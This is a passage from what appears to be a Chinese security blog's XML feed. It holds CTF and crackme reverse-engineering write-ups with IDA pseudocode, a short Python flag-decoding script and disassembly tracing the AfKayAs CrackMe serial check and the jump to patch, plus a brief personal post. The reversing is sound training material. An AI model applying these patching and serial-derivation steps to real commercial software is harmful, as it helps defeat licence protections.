8192</code>。</p><p>最终，通过setbuf设置stdout为无缓冲模式，解决了额外内存块的问题，本文没有分析缓冲区相应的堆内存问题。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.litreily.top/2018/10/25/io-cache/" target="_blank" rel="noopener">https://www.litreily.top/2018/10/25/io-cache/</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写于20200308</title>
      <link href="/2020/03/08/%E5%86%99%E4%BA%8E20200308/"/>
      <url>/2020/03/08/%E5%86%99%E4%BA%8E20200308/</url>
      
        <content type="html"><![CDATA[<p>重新启用这个荒废了大半年的博客，清理掉了原来的日常性质文章，略微提高了博客的技术浓度。</p><p>半年来也没太多成长，开了好几个坑都没坚持写下去。加上报了考研班，这些坑要留到一年之后再慢慢完结了。</p><p>说到考研，这个问题决定了很久，最终是由于认识到技术基础的缺失和不足，难以满足自己心仪的岗位要求，加上对一些理论的东西也有兴趣，不排斥做科研，就决定考研了。但目前还是有一些迷茫，目前不清楚自己真正喜欢的方向，这点来源于自己对安全的认识依然不够深入，不能很好地区分出方向，导致现在像无头苍蝇一样。考研课听起来也没什么兴趣，做题背单词毫无效率。</p><p>决定将一些自己在学校学到的东西也更新到博客上，原本是想只放安全的东西的，现在想想自己专业课里其实还是有不少巩固基础的内容，更何况自己基础本来也不强。</p><p>最近又把pwn捡起来刷了十几道题，每次做题都会有一些新的体会，调试的时候能够看得更清晰一些，不过堆还是太牵涉精力，考研也不太有这种精力了。这十几道题的wp网上有很多，原理也十分的基础，没必要再像自己以前一样重新写一遍了。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>齐鲁护网-clipboard</title>
      <link href="/2019/07/08/%E9%BD%90%E9%B2%81%E6%8A%A4%E7%BD%91-clipboard/"/>
      <url>/2019/07/08/%E9%BD%90%E9%B2%81%E6%8A%A4%E7%BD%91-clipboard/</url>
      
        <content type="html"><![CDATA[<p><a href="clipboard.exe"><strong>程序下载</strong></a></p><p>在IDA中搜索字符串、查引用。大致看了一下猜测应该是程序从剪贴板读取flag做判断。使用IDA调试时，发现<code>IsClipboardFormatAvaliable</code>方法调用后程序直接退出。通过此处爆破，以及后面一处爆破（IDA的Graph view下，有一步跳转之后可以看到格式化字符串输出，由此猜测跳转为关键跳，爆破后果然输出了flag）最后得到flag。挖个坑以后补上分析过程。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>齐鲁护网-RE1</title>
      <link href="/2019/07/08/%E9%BD%90%E9%B2%81%E6%8A%A4%E7%BD%91-RE1/"/>
      <url>/2019/07/08/%E9%BD%90%E9%B2%81%E6%8A%A4%E7%BD%91-RE1/</url>
      
        <content type="html"><![CDATA[<p><a href="re1.exe"><strong>程序下载</strong></a></p><blockquote><p>一场简单的CTF，逆向一共7道，其中一道异或加密、一道不太清楚（我直接改跳转爆破出来的）、一道mfc、一道简单的虚拟化（虚拟化没接触过，看了真的头大，有没有师傅教教我）、一道wasm（没接触过）、一道脱壳、一道反调试，感觉题型还挺全的233，但是自己太菜，只做了两道，逆向学习任重道远啊。。。。。。</p></blockquote><p>下载题目之后先运行一下</p><p><img src="/2019/07/08/齐鲁护网-RE1/1.jpg" alt="运行"></p><p>没什么特别的，直接上IDA了，搜索一下字符串。</p><p><img src="/2019/07/08/齐鲁护网-RE1/2.jpg" alt="search"></p><p>查找引用，只找到了一处引用，F5结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_401FF0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">bool</span> v7; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v8; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">108</span>]; <span class="comment">// [esp+8h] [ebp-70h]</span></span><br><span class="line"></span><br><span class="line">  sub_4073F0(v13, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">  v1 = sub_4022B0(v0, <span class="string">"welcome!"</span>);</span><br><span class="line">  sub_402560(v1);</span><br><span class="line">  v3 = sub_4022B0(v2, <span class="string">"please input the flag"</span>);</span><br><span class="line">  sub_402560(v3);</span><br><span class="line">  sub_4010E0((<span class="keyword">int</span>)<span class="string">"%s"</span>, v13, <span class="number">100</span>);</span><br><span class="line">  v4 = (_BYTE *)<span class="built_in">strlen</span>(v13);</span><br><span class="line">  <span class="keyword">if</span> ( v4 != (_BYTE *)<span class="number">38</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v13[v5] = (v13[v5] ^ <span class="number">5</span>) + <span class="number">1</span>;</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; <span class="built_in">strlen</span>(v13) );</span><br><span class="line">  v4 = &amp;unk_4339B0;</span><br><span class="line">  v6 = v13;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (<span class="keyword">unsigned</span> __int8)*v6 &lt; *v4;</span><br><span class="line">    <span class="keyword">if</span> ( *v6 != *v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*v6 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    v8 = v6[<span class="number">1</span>];</span><br><span class="line">    v7 = v8 &lt; v4[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v8 != v4[<span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 += <span class="number">2</span>;</span><br><span class="line">    v4 += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = -v7 | <span class="number">1</span>;</span><br><span class="line">LABEL_11:</span><br><span class="line">  v10 = <span class="string">"right!"</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">LABEL_16:</span><br><span class="line">    v10 = <span class="string">"false!"</span>;</span><br><span class="line">  v11 = sub_4022B0(v4, v10);</span><br><span class="line">  sub_402560(v11);</span><br><span class="line">  sub_409F80(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据<code>v4 = &amp;unk_4339B0</code>以及flag长度19，得到flag加密结果djec.1pj=6PHDqSbVwtwWDQJL`87ph1g2t~8}y</p><p>经过解密得到flag。脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'djec.1pj=6PHDqSbVwtwWDQJL`87ph1g2t~8&#125;y '</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s)):</span><br><span class="line">    x = (ord(s[i])<span class="number">-1</span>)^<span class="number">5</span></span><br><span class="line">    print(chr(x),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AfKayAs CrackMe #1</title>
      <link href="/2019/05/08/AfKayAs-CrackMe-1/"/>
      <url>/2019/05/08/AfKayAs-CrackMe-1/</url>
      
        <content type="html"><![CDATA[<p><a href="Afkayas.1.Exe">这道题</a>在win10运行时需要先下载VB的<a href="msvbvm50.exe">运行环境</a>。</p><p>题目一打开就是输入框，没有开头需要跳过的弹窗了。</p><p>先运行一下，随便输入点东西，得到如下结果：</p><p><img src="/2019/05/08/AfKayAs-CrackMe-1/1.png" alt="pic"></p><p>根据关键字下断（输入为123和456）：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">0040258B | <span class="number">74</span> <span class="number">58</span>                    | <span class="keyword">je</span> afkayas<span class="meta">.1</span><span class="meta">.4025E5</span>                            | 关键跳</span><br><span class="line"><span class="number">0040258D</span> | <span class="number">68</span> <span class="number">80</span> <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B80                          | 401B80:L<span class="string">"You Get It"</span></span><br><span class="line"><span class="number">00402592</span> | <span class="number">68</span> 9C <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B9C                          | 401B9C:L<span class="string">"\r\n"</span></span><br><span class="line"><span class="number">00402597</span> | FF D7                    | <span class="keyword">call</span> <span class="built_in">edi</span>                                       |</span><br><span class="line"><span class="number">00402599</span> | 8B D0                    | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">0040259B | <span class="number">8D</span> <span class="number">4D</span> E8                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line">0040259E | FF D3                    | <span class="keyword">call</span> <span class="built_in">ebx</span>                                       |</span><br><span class="line">004025A0 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004025A1 | <span class="number">68</span> A8 <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401BA8                          | 401BA8:L<span class="string">"KeyGen It Now"</span></span><br><span class="line">004025A6 | FF D7                    | <span class="keyword">call</span> <span class="built_in">edi</span>                                       |</span><br><span class="line">004025A8 | <span class="number">8D</span> <span class="number">4D</span> <span class="number">94</span>                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-6C]                  |</span><br><span class="line">004025AB | <span class="number">89</span> <span class="number">45</span> CC                 | <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">34</span>],<span class="built_in">eax</span>                  |</span><br><span class="line">004025AE | <span class="number">8D</span> <span class="number">55</span> A4                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-5C]                  |</span><br><span class="line">004025B1 | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line">004025B2 | <span class="number">8D</span> <span class="number">45</span> B4                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-4C]                  |</span><br><span class="line">004025B5 | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line">004025B6 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004025B7 | <span class="number">8D</span> <span class="number">4D</span> C4                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-3C]                  |</span><br><span class="line">004025BA | 6A <span class="number">00</span>                    | <span class="keyword">push</span> <span class="number">0</span>                                         |</span><br><span class="line">004025BC | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line">004025BD | C7 <span class="number">45</span> C4 <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>     | <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-3C],<span class="number">8</span>                    |</span><br><span class="line">004025C4 | FF <span class="number">15</span> <span class="number">10</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;rtcMsgBox&gt;]               |</span><br><span class="line">004025CA | <span class="number">8D</span> <span class="number">4D</span> E8                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line">004025CD | FF <span class="number">15</span> <span class="number">80</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaFreeStr&gt;]             |</span><br><span class="line">004025D3 | <span class="number">8D</span> <span class="number">55</span> <span class="number">94</span>                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-6C]                  |</span><br><span class="line">004025D6 | <span class="number">8D</span> <span class="number">45</span> A4                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-5C]                  |</span><br><span class="line">004025D9 | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line">004025DA | <span class="number">8D</span> <span class="number">4D</span> B4                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-4C]                  |</span><br><span class="line">004025<span class="built_in">DD</span> | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004025DE | <span class="number">8D</span> <span class="number">55</span> C4                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-3C]                  |</span><br><span class="line">004025E1 | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line">004025E2 | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line">004025E3 | EB <span class="number">56</span>                    | <span class="keyword">jmp</span> afkayas<span class="meta">.1</span>.40263B                           |</span><br><span class="line">004025E5 | <span class="number">68</span> C8 <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401BC8                          | 401BC8:L<span class="string">"You Get Wrong"</span></span><br><span class="line">004025EA | <span class="number">68</span> 9C <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B9C                          | 401B9C:L<span class="string">"\r\n"</span></span><br><span class="line">004025EF | FF D7                    | <span class="keyword">call</span> <span class="built_in">edi</span>                                       |</span><br><span class="line">004025F1 | 8B D0                    | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004025F3 | <span class="number">8D</span> <span class="number">4D</span> E8                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line">004025F6 | FF D3                    | <span class="keyword">call</span> <span class="built_in">ebx</span>                                       |</span><br><span class="line">004025F8 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004025F9 | <span class="number">68</span> E8 <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401BE8                          | 401BE8:L<span class="string">"Try Again"</span></span><br><span class="line">004025FE | FF D7                    | <span class="keyword">call</span> <span class="built_in">edi</span>                                       |</span><br></pre></td></tr></table></figure><p>可以看到40258B处为控制正确错误信息的跳转，爆破的话改这里就好了。回到注册算法分析上，向上找几个函数：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00402415</span> | FF <span class="number">15</span> E4 <span class="number">40</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaLenBstr&gt;]             | get length</span><br><span class="line">0040241B | 8B F8                    | <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">0040241D</span> | 8B <span class="number">4D</span> E8                 | <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402420</span> | <span class="number">69</span> FF FB 7C <span class="number">01</span> <span class="number">00</span>        | <span class="keyword">imul</span> <span class="built_in">edi</span>,<span class="built_in">edi</span>,17CFB                             | len * <span class="number">0x17cfb</span></span><br><span class="line"><span class="number">00402426</span> | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line"><span class="number">00402427</span> | 0F <span class="number">80</span> <span class="number">91</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">jo</span> afkayas<span class="meta">.1</span>.4026BE                            |</span><br><span class="line"><span class="number">0040242D</span> | FF <span class="number">15</span> F8 <span class="number">40</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;rtcAnsiValueBstr&gt;]        | 得到首字母</span><br><span class="line"><span class="number">00402433</span> | 0F BF D0                 | <span class="keyword">movsx</span> <span class="built_in">edx</span>,<span class="built_in">ax</span>                                   |</span><br><span class="line"><span class="number">00402436</span> | <span class="number">03</span> FA                    | <span class="keyword">add</span> <span class="built_in">edi</span>,<span class="built_in">edx</span>                                    | 得到 len * <span class="number">0x17cfb</span> + 首字母</span><br><span class="line"><span class="number">00402438</span> | 0F <span class="number">80</span> <span class="number">80</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">jo</span> afkayas<span class="meta">.1</span>.4026BE                            |</span><br><span class="line">0040243E | <span class="number">57</span>                       | <span class="keyword">push</span> <span class="built_in">edi</span>                                       |</span><br><span class="line">0040243F | FF <span class="number">15</span> E0 <span class="number">40</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaStrI4&gt;]               | 运算结果转为十进制数的字符串格式</span><br><span class="line"><span class="number">00402445</span> | 8B D0                    | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402447</span> | <span class="number">8D</span> <span class="number">4D</span> E0                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">20</span>]                  |</span><br><span class="line">0040244A | FF <span class="number">15</span> <span class="number">70</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaStrMove&gt;]             |</span><br><span class="line"><span class="number">00402450</span> | 8B BD <span class="number">50</span> FF FF FF        | <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-B0]                  |</span><br><span class="line"><span class="number">00402456</span> | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402457</span> | <span class="number">57</span>                       | <span class="keyword">push</span> <span class="built_in">edi</span>                                       |</span><br><span class="line"><span class="number">00402458</span> | FF <span class="number">93</span> A4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+A4]                     |</span><br><span class="line">0040245E | <span class="number">85</span> C0                    | <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>                                   | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402460</span> | <span class="number">7D</span> <span class="number">12</span>                    | <span class="keyword">jge</span> afkayas<span class="meta">.1</span><span class="meta">.402474</span>                           |</span><br><span class="line"><span class="number">00402462</span> | <span class="number">68</span> A4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           | <span class="keyword">push</span> A4                                        |</span><br><span class="line"><span class="number">00402467</span> | <span class="number">68</span> 5C <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B5C                          |</span><br><span class="line">0040246C | <span class="number">57</span>                       | <span class="keyword">push</span> <span class="built_in">edi</span>                                       |</span><br><span class="line"><span class="number">0040246D</span> | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">0040246E | FF <span class="number">15</span> <span class="number">04</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaHresultCheckObj&gt;]     |</span><br><span class="line"><span class="number">00402474</span> | <span class="number">8D</span> <span class="number">45</span> E0                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">20</span>]                  |</span><br><span class="line"><span class="number">00402477</span> | <span class="number">8D</span> <span class="number">4D</span> E4                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-1C]                  | [<span class="built_in">ebp</span>-1C]:L<span class="string">"123"</span></span><br><span class="line">0040247A | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">0040247B | <span class="number">8D</span> <span class="number">55</span> E8                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span 